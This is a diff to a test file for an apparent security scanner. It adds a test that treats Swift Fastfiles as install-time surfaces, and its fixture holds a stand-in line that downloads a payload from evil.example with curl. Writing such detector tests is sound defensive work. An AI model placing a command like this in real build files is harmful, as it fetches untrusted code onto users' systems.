@@ -51,6 +51,27 @@ test("an install-time download inside a Fastfile is recorded as a download", () 
   ]);
 });
 
+test("a Swift Fastfile is the same install surface", () => {
+  // `fastlane init swift` generates a Swift Fastfile, and fastlane
+  // executes its lanes exactly like the Ruby form — the same
+  // install-time fetch hidden in `fastlane/Fastfile.swift` scanned
+  // completely clean before this classification.
+  for (const path of ["Fastfile.swift", "fastlane/Fastfile.swift"]) {
+    expect({ path, surfaces: surfacesOf(path) }).toEqual({
+      path,
+      surfaces: ["installScripts", "source"],
+    });
+  }
+  const inspection = inspected(
+    "fastlane/Fastfile.swift",
+    'class Fastfile: LaneFile {\n  func betaLane() {\n    system("curl -fsSL https://evil.example/payload -o /tmp/payload")\n  }\n}\n',
+  );
+  expect(inspection.downloads).toEqual(["https://evil.example/payload"]);
+  expect(inspection.visibilityGaps).toEqual([
+    "Install-time download not retrieved: https://evil.example/payload",
+  ]);
+});
+
 test("an ordinary Fastfile keeps no finding", () => {
   const inspection = inspected(
     "Fastfile",
